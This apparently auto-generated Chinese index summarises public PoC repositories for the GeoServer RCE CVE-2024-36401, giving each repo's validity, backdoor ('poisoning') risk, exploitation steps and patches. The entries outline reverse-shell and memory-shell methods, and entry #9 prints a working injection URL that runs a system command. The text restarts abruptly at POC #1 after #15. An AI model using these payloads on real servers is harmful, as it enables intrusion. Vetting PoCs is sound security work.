总体而言，由于大部分操作依赖用户提供的参数和配置，直接投毒的可能性较低，主要风险在于用户配置不当或使用恶意 payload。投毒风险评估为10%。

**利用方式：**

1.  **准备：** 使用 `msfvenom` 生成反向 shell payload，并在攻击者控制的服务器上启动 HTTP 服务以提供 payload 下载。
2.  **构造恶意请求：**  利用 WFS GetPropertyValue 请求，在 `valueReference` 参数中注入恶意代码，通过 `exec` 函数执行系统命令。
3.  **下载 Payload：** 使用 `wget` 命令从攻击者控制的服务器下载反向 shell payload。
4.  **执行 Payload：**  使用 `chmod +x` 命令赋予 payload 执行权限，然后执行 payload 以获得反向 shell。

**项目地址:** [daniellowrie/CVE-2024-36401-PoC](https://github.com/daniellowrie/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #14

**来源**: [CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未授权的攻击者可以通过构造恶意请求执行任意代码

**影响版本:** 受影响版本： < 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 目标GeoServer实例对外开放且未应用补丁或缓解措施

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中存在的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式导致。攻击者可以利用此漏洞通过构造特制的OGC请求（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）在目标服务器上执行任意代码。

**有效性：**
根据漏洞信息、搜索引擎结果，特别是CISA的已知被利用漏洞列表，以及提供的利用代码（WoodpeckerPlugin），可以判断此漏洞POC**有效**并且已被积极利用。

**投毒风险：**
提供的 WoodpeckerPlugin 旨在简化漏洞利用过程，但也存在一定投毒风险。风险点在于：
1.  **自定义内存马注入：** 虽然插件提供了默认的冰蝎内存马，但允许用户自定义内存马，如果用户不熟悉内存马，可能引入恶意代码。
2.  **Woodpecker 框架：** 该插件依赖于 Woodpecker 框架，若框架本身存在安全问题，则会影响所有插件。
3.  **源码审查不足：** 用户可能直接使用编译好的插件，而未进行充分的源码审查，增加了潜在的风险。虽然作者声明免责，但是下载来路不明的jar包，本身就存在风险。
4.  **命令执行的安全性：** 通过`command`参数执行任意命令，本身权限过大，存在风险。命令日志记录是否完善，也会影响溯源。
综合评估，投毒风险大约为10%，风险较低，主要集中在用户自定义操作上。

**利用方式：**
1.  **探测：** 使用插件的 Poc 模块进行批量探测，判断目标是否存在 CVE-2024-36401 漏洞。
2.  **命令执行：** 通过 Exploit 模块，设置 `command` 参数执行任意命令。
3.  **内存马注入：** 使用默认或自定义的内存马，注入到 GeoServer 进程中，实现更持久的控制。

**缓解措施：**
1.  升级 GeoServer 到已修复的版本 (>= 2.22.6, >= 2.23.6, >= 2.24.4, >= 2.25.2)。
2.  移除 `gt-complex-x.y.jar` 文件（可能影响部分功能）。
3.  使用防火墙或其他安全设备限制对 GeoServer 的访问。
4.  加强对GeoServer日志的监控，及时发现异常行为。

**项目地址:** [funnyDog896/CVE-2024-36401-WoodpeckerPlugin](https://github.com/funnyDog896/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #15

**来源**: [CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md](../2024/CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md)

# CVE-2024-36401

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-36401-0x0d3ad_CVE-2024-36401.md](../2024/CVE-2024-36401-0x0d3ad_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0, < 2.23.6, >= 2.24.0, < 2.24.4, >= 2.25.0, < 2.25.2

**利用条件:** 需要能够访问GeoServer服务的网络连接，默认安装环境

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式而导致。攻击者可以通过构造特制的 OGC 请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来利用此漏洞，从而在服务器上执行任意代码。提供的 POC 代码首先通过 GET 请求 `/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0` 获取 `ReturnFeatureType`，然后构造一个包含恶意 XPath 表达式的 POST 请求，发送到 `/geoserver/wfs`，表达式中利用 `java.lang.Runtime.getRuntime()` 执行 base64 编码的反弹 shell 命令。POC中的投毒风险较低，主要体现在脚本中可能包含潜在的恶意代码，或者利用社会工程学诱导用户执行恶意操作。例如，如果脚本被修改为下载和执行额外的恶意负载，或者收集用户的敏感信息，就会造成更大的安全威胁。 此处的"poison"指的是，如果攻击者上传包含后门代码的图层定义，然后诱导其他用户下载并使用该定义，则可能构成投毒攻击。

**项目地址:** [0x0d3ad/CVE-2024-36401](https://github.com/0x0d3ad/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #2

**来源**: [CVE-2024-36401-Chocapikk_CVE-2024-36401.md](../2024/CVE-2024-36401-Chocapikk_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 目标GeoServer实例运行在受影响的版本上，且允许网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞。该漏洞源于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库进行评估，从而允许未经身份验证的用户通过特制的OGC请求执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果（多个安全厂商已确认该漏洞被利用）和提供的漏洞利用代码，可以判定此漏洞是有效的，并且已经被积极利用。

**投毒风险：**
漏洞利用代码 `exploit.py` 主要是实现漏洞利用的功能，从代码结构和功能来看，投毒风险较低。主要功能是发送恶意请求，监听反弹shell。代码中也定义了一些参数，比如远程IP、远程端口、代理等等。代码比较清晰，逻辑简单。但是依然不能排除作者在某些不明显的代码中加入恶意代码的可能性，特别是代码涉及到网络请求和系统命令执行。因此，评估投毒风险为 10%。

**利用方式：**
1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求），其中包含特制的XPath表达式。这些请求会被GeoServer处理，并将属性名称传递给 commons-jxpath 库。
2.  **代码执行：** commons-jxpath 库在评估这些XPath表达式时，会执行攻击者注入的恶意代码。
3.  **反弹 Shell (POC中方式)：** 漏洞利用代码会启动一个监听器，然后在目标系统上执行命令以反弹 shell 到攻击者的机器上。  `exploit.py` 脚本允许攻击者指定目标 URL、攻击者 IP 地址和端口。通过命令行参数 `--url`, `--remote-ip`, 和 `--remote-port` 设置。
4.  **批量扫描:** 漏洞利用代码还支持批量扫描，通过 `--check <file_with_urls>` 指定包含URL列表的文件， `--threads <number_of_threads>`  指定线程数， `--output <output_file>` 指定输出文件。

**项目地址:** [Chocapikk/CVE-2024-36401](https://github.com/Chocapikk/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #3

**来源**: [CVE-2024-36401-Mr-xn_CVE-2024-36401.md](../2024/CVE-2024-36401-Mr-xn_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的用户可以通过构造的OGC请求执行任意代码

**影响版本:** 2.22.0 < version < 2.22.6, 2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** GeoServer服务可网络访问，并且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞。该漏洞源于GeoTools库API以不安全的方式将属性/属性名称传递给commons-jxpath库，从而允许执行任意代码。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic和WPS Execute）来利用此漏洞，执行任意代码。

**有效性：**
提供的POC代码利用了`valueReference`参数执行任意命令，例如计算器程序。从漏洞描述和搜索引擎结果来看，POC是有效的，并且已被野外利用。

**投毒风险：**
查看提供的POC代码和LICENSE文件。LICENSE采用MIT许可，相对宽松。代码本身主要是提供了漏洞的利用方式，没有发现明显的恶意代码。README中包含绕过WAF的payload，以及各种请求方式（GetPropertyValue, GetFeature）的PoC。

*   LICENSE文件: MIT License, 比较通用，没有发现可疑之处
*   README文件：提供了漏洞的描述和多个PoC示例，没有直接执行恶意操作的代码。

综合来看，投毒风险较低，在10%左右。主要风险来自于对POC的滥用，而非POC本身包含恶意代码。

**利用方式：**
1.  确定目标GeoServer版本在受影响范围内。
2.  使用提供的PoC构造恶意OGC请求。
3.  利用`valueReference`参数或`PropertyName`，注入包含恶意代码的XPath表达式。
4.  发送构造的请求到目标GeoServer服务器。
5.  如果漏洞存在，服务器将执行注入的代码。

**项目地址:** [Mr-xn/CVE-2024-36401](https://github.com/Mr-xn/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #4

**来源**: [CVE-2024-36401-Niuwoo_CVE-2024-36401.md](../2024/CVE-2024-36401-Niuwoo_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的攻击者可以通过精心构造的输入来执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，以及 2.23.0 到 2.23.6，2.24.0 到 2.24.4，以及 2.25.0 到 2.25.2。

**利用条件:** 需要目标GeoServer实例存在于网络上并且可以访问 /geoserver/wfs 接口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，源于 GeoTools 库 API 对属性名称的处理不当。攻击者可以通过向 GeoServer 的 WFS 接口发送特制的 OGC 请求，利用 XPath 表达式注入来执行任意代码。此漏洞影响默认 GeoServer 安装，无需身份验证。

**漏洞分析：**

根据漏洞库信息和搜索引擎结果，该漏洞允许未经身份验证的攻击者通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求执行任意代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，从而允许执行任意 XPath 表达式。

**POC 代码分析：**

提供的 POC 代码是一个 Python 脚本，用于检测和利用 CVE-2024-36401 漏洞。该脚本包含以下功能：

*   `check_vuln(url)`: 发送一个包含恶意 payload 的 WFS GetPropertyValue 请求到目标 GeoServer 实例，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为目标存在漏洞。
*   `exploit_vuln(url, cmd)`:  发送一个包含恶意 payload 的 WFS GetPropertyValue 请求，其中 payload 包含要执行的命令。该函数通过 `java.lang.Runtime.getRuntime()` 来执行命令。同样，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为利用成功。
*   `multithreading(url_list, pools=5)`:  使用线程池对 URL 列表执行漏洞检测。
*   `init_config()`:  解析命令行参数，包括目标 URL、URL 列表和要执行的命令。

**有效性：**

POC 代码通过构造恶意的 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行任意代码。从漏洞库信息和搜索引擎结果来看，该漏洞已被广泛确认和利用，并且POC代码的逻辑正确，所以判断提供的 POC 代码有效。

**投毒风险：**

分析 POC 代码后，没有发现明显的恶意代码或后门。POC 代码的功能是发送包含恶意 payload 的 HTTP 请求，从而利用漏洞执行命令。脚本中的 `exec(java.lang.Runtime.getRuntime(),"...")` 部分是利用漏洞的关键，但它本身并不是恶意代码，而是漏洞利用的一部分。作者将执行命令的权限交给了使用者,是否需要投毒取决于使用者。

**利用方式：**

1.  使用 `check_vuln(url)` 函数检测目标 GeoServer 实例是否存在漏洞。
2.  如果目标存在漏洞，使用 `exploit_vuln(url, cmd)` 函数执行任意命令。命令通过命令行参数 `-c` 传递。
3.  可以使用 `-f` 参数指定一个包含多个 URL 的文件，并使用 `multithreading(url_list,10)` 函数进行批量检测。

总的来说，该 POC 代码是有效的，并且没有发现投毒风险。它允许攻击者远程执行任意代码，对 GeoServer 实例构成严重威胁。

**项目地址:** [Niuwoo/CVE-2024-36401](https://github.com/Niuwoo/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #5

**来源**: [CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md](../2024/CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 2.22.6 之前，2.23.0 到 2.23.6 之间，2.24.0 到 2.24.4 之间，以及 2.25.0 到 2.25.2 之间的版本

**利用条件:** 目标GeoServer实例对外开放且运行于受影响的版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行(RCE)漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。未经身份验证的攻击者可以通过构造恶意的OGC请求参数（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute requests）来利用此漏洞，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞已被积极利用。提供的POC代码仓库 `RevoltSecurities/CVE-2024-36401` 提供了一个用于检测和利用此漏洞的工具，包含docker-compose 文件用于搭建测试环境，以及 `exploit.py` 脚本用于漏洞利用，因此POC代码有效。

**投毒风险：**
*   `exploit.py` 文件中，脚本尝试与`https://api.cvssadvisor.com/ssrf/` 建立连接。这是一个潜在的风险点，因为攻击者可能通过控制该API来收集目标信息或进行其他恶意活动。但目前只是get请求实例信息，危害较小。但从代码的整体结构来看，投毒的风险较低。主要的功能还是针对`CVE-2024-36401`的利用。综上，认为投毒风险较低，约为10%。

**利用方式：**
1.  **确定目标GeoServer版本：** 确认目标GeoServer实例是否在受影响的版本范围内。
2.  **发送恶意OGC请求：** 构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。请求的Payload包含恶意的XPath表达式注入。
3.  **远程代码执行：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库，导致执行任意代码。
4.  **利用工具：** 使用提供的`exploit.py`脚本，指定目标URL，通过发送恶意请求触发漏洞。

简而言之，攻击者通过发送特制的OGC请求，利用GeoServer对属性名表达式的不安全评估，实现远程代码执行。

**项目地址:** [RevoltSecurities/CVE-2024-36401](https://github.com/RevoltSecurities/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #6

**来源**: [CVE-2024-36401-URJACK2025_CVE-2024-36401.md](../2024/CVE-2024-36401-URJACK2025_CVE-2024-36401.md)

## CVE-2024-36401 GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2

**利用条件:** GeoServer实例暴露在网络上，且运行在受影响版本范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，该漏洞源于GeoTools库在处理属性名称时，不安全地将其传递给commons-jxpath库进行XPath表达式的评估。由于此XPath评估被错误地应用于简单要素类型，因此影响了所有GeoServer实例。攻击者可以通过构造恶意的WFS、WMS或WPS请求，在未经身份验证的情况下，利用`valueReference`注入Java代码来执行任意系统命令。

**有效性：** 提供的PoC代码 `exp.py` 利用了此漏洞。它通过构造包含恶意代码的XML Payload，并将其发送到GeoServer的WFS接口 `/geoserver/wfs`，从而实现远程命令执行。PoC提供了两种利用模式：`cmd` 模式用于执行单条命令，`reverse` 模式用于建立反弹Shell连接。

**投毒风险：**  该PoC存在一定的投毒风险，虽然主要功能是利用漏洞，但攻击者可以利用PoC的灵活性嵌入恶意代码，例如下载并执行额外的恶意软件。反弹shell的bash命令和http请求等行为都有可能被恶意利用。风险预估为10%。

**利用方式：**
1.  **确定目标:**  确定运行着存在漏洞版本的GeoServer实例，并确认其网络可访问性。
2.  **构造Payload:** 使用PoC脚本 `exp.py`，选择 `cmd` 模式执行任意命令，或者选择 `reverse` 模式建立反弹Shell。
3.  **发送请求:**  PoC脚本会构造包含恶意Java代码的XML Payload，并通过POST请求发送到目标的WFS接口 `/geoserver/wfs`。
4.  **执行代码:**  如果漏洞存在，GeoServer会执行Payload中的恶意代码，从而实现远程命令执行。如果是反弹shell模式，需要在攻击者机器上监听指定端口，等待目标机器反弹shell连接。

**项目地址:** [URJACK2025/CVE-2024-36401](https://github.com/URJACK2025/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #7

**来源**: [CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md](../2024/CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，可能导致服务器完全控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的 OGC 请求参数执行远程代码。漏洞利用方式是通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求等多种方式。漏洞利用代码仓库中只包含 LICENSE 文件，并未发现任何可疑的投毒代码。

**项目地址:** [XiaomingX/cve-2024-36401-poc](https://github.com/XiaomingX/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #8

**来源**: [CVE-2024-36401-ahisec_geoserver-.md](../2024/CVE-2024-36401-ahisec_geoserver-.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许通过 WFS/WMS/WPS 接口进行网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的攻击者通过构造特制的OGC请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来执行远程代码。漏洞根源在于 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，这使得攻击者可以在 XPath 表达式中注入恶意代码。提供的PoC代码展示了如何利用 `wfs:GetPropertyValue` 请求执行命令。它首先建议使用 `wfs:ListStoredQueries` 获取有效的 `wfs:ReturnFeatureType` 值，然后将其用于构建 `wfs:Query typeNames` 参数，以提高漏洞利用的准确性。示例payload包括了ping命令的执行和反弹shell的payload，以及内存马注入的payload。文章中提到的误判几率较高是因为直接使用 `sf:archsites` ，如果目标环境中不存在该feature type,则会报错。建议先获取可用的feature type名称。

**有效性：**
提供的PoC代码利用了漏洞描述中提到的攻击向量，并且参考了GitHub上的公开PoC（https://github.com/Mr-xn/CVE-2024-36401）。多个搜索结果表明该漏洞正在被积极利用（https://www.fortinet.com/blog/threat-research/threat-actors-exploit-geoserver-vulnerability-cve-2024-36401，https://www.sonicwall.com/blog/geoserver-rce-vulnerability-cve-2024-36401-being-exploited-in-the-wild），表明该漏洞的利用是有效的。

**投毒风险：**
在提供的PoC代码中，没有发现明显的投毒代码。代码主要提供了漏洞利用的思路和示例payload，包括执行ping命令、反弹shell和注入内存马。反弹shell和内存马需要用户提供恶意代码，因此不存在作者隐藏的后门代码。因此，投毒风险评估为0%。

**利用方式：**
1.  **确定目标 GeoServer 版本：** 确认目标 GeoServer 版本在受影响的范围内。
2.  **获取有效的Feature Type：** 使用 `wfs:ListStoredQueries` 请求获取有效的 `<wfs:ReturnFeatureType>`值。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 `wfs:GetPropertyValue` 请求，其中 `wfs:Query typeNames` 参数使用从步骤2中获得的Feature Type.
4.  **发送请求：** 将构造的恶意请求发送到目标 GeoServer 的 WFS 接口。
5.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码。

**项目地址:** [ahisec/geoserver-](https://github.com/ahisec/geoserver-)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #9

**来源**: [CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md](../2024/CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.22.0 < version < 2.22.6
2.23.0 <= version < 2.23.6
2.24.0 <= version < 2.24.4
2.25.0 <= version < 2.25.2

**利用条件:** 需要网络访问，目标服务器运行存在漏洞的 GeoServer 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，源于 GeoTools 库 API 不安全地将属性名传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。漏洞存在于所有 GeoServer 实例中，可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**POC 有效性分析：**

提供的 POC 代码看起来是有效的。它包含以下关键功能：

*   使用 `requests` 库发送 HTTP 请求。
*   使用 `lxml` 库解析 XML 响应，提取 `Typenames`，并自动化的爬取所有Typenames信息，并循环测试可以利用的Typenames，修复Nuclei POC中由于Typenames写死，造成漏洞验证失败的问题。
*   支持 `-c` 参数执行命令，或使用 DNSLog 进行验证。
*   支持批量 URL 检测。

这些功能对应了漏洞的利用方式，即通过构造特定的 OGC 请求，利用 XPath 表达式注入执行任意命令。

**投毒风险分析：**

代码中存在轻微的投毒风险。风险点在于：

*   作者在代码中留下了版权声明，虽然这是正常的，但也增加了作者控制代码的风险。
*   虽然脚本本身的功能是漏洞利用，但如果作者恶意地修改了脚本，例如，在执行命令后添加额外的恶意操作，或者收集目标服务器的信息并发送给攻击者，那么就存在投毒风险。

综合考虑，投毒风险较低，约为 10%。此风险主要来自于作者是否会利用更新或维护代码的机会植入后门。

**利用方式总结：**

1.  **确定目标 GeoServer 版本：** 确认目标服务器运行的 GeoServer 版本在受影响范围内。
2.  **获取 Typenames：** 通过 WFS GetCapabilities 请求或其他方式获取目标 GeoServer 实例的 Typenames 信息。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 WFS/WMS/WPS 请求，将命令注入到 property/attribute name 中。
4.  **发送请求：** 将构造好的请求发送到目标 GeoServer 服务器。
5.  **验证漏洞：** 通过 DNSLog 或者检查命令执行结果验证漏洞是否存在。

例如，可以使用类似以下的 URL 构造恶意请求：

```
/geoserver/wfs?service=WFS&version=1.0.0&request=GetFeature&typeName=<typeName>&propertyName=fes:ResourceId&Filter=<%20fes:Filter%20xmlns:fes=%22http://www.opengis.net/fes/2.0%22%20xmlns:gml=%22http://www.opengis.net/gml/3.1.1%22%20xmlns:ogc=%22http://www.opengis.net/ogc%22><ogc:Function%20name=%22script:js%22><ogc:Literal><![CDATA[java.lang.Runtime.getRuntime().exec('touch /tmp/pwned');]]></ogc:Literal></ogc:Function></fes:Filter>
```

**项目地址:** [amoy6228/CVE-2024-36401_Geoserver_RCE_POC](https://github.com/amoy6228/CVE-2024-36401_Geoserver_RCE_POC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #10

**来源**: [CVE-2024-36401-bigb0x_CVE-2024-36401.md](../2024/CVE-2024-36401-bigb0x_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 需要目标GeoServer实例存在漏洞，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo和WPS Execute）利用此漏洞，执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以确认该POC代码是有效的。搜索结果中多个来源（如Fortinet、Keysight、SonicWall、Rapid7等）都表明该漏洞已被实际利用。

**投毒风险：**
分析提供的POC代码后，发现存在一定的投毒风险。虽然代码的主要功能是利用漏洞执行反向shell，但在以下几个方面存在潜在的投毒可能性：

1.  **对 nc 命令的依赖：**  POC 依赖目标系统存在 `nc` (netcat) 命令。如果目标系统没有 `nc`，利用会失败。攻击者可能会修改 POC，尝试使用其他命令（如 `wget` 或 `curl`）下载并执行恶意脚本，从而实现更隐蔽或更复杂的攻击。
2.  **反向 Shell 的隐蔽性：**  反向 shell 连接通常会被防火墙或入侵检测系统拦截。攻击者可能会尝试使用加密或其他混淆技术来绕过这些安全措施。
3.  **日志记录和错误处理：**  POC 具有基本的日志记录功能，但可能不足以记录所有关键操作。攻击者可以修改代码，删除或篡改日志，以隐藏其活动。

总的来说，由于POC的目的是快速验证漏洞，相对比较简单，因此投毒的可能性相对较低，但仍然需要警惕。

**利用方式：**
该漏洞的利用方式主要通过以下步骤：

1.  **构建恶意OGC请求：** 攻击者构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。
2.  **发送恶意请求：** 攻击者将构造的恶意请求发送到目标GeoServer实例。
3.  **执行任意代码：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库进行评估，从而导致任意代码执行。
4.  **反向Shell (POC使用):** POC 尝试建立反向 shell 连接，允许攻击者远程控制受感染的服务器。POC 发送一个POST请求，在请求中使用的payload来执行反向shell，连接到攻击者的机器。

**项目地址:** [bigb0x/CVE-2024-36401](https://github.com/bigb0x/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #11

**来源**: [CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md](../2024/CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称评估为 XPath 表达式，未经身份验证的用户可以通过构造特制的 OGC 请求参数来执行远程代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞利用已被证实有效，并且在野外已被利用。提供的漏洞利用代码（GeoServer-Tools）旨在简化利用过程，支持不同 JDK 版本的回显和内存马注入。

**投毒风险：**
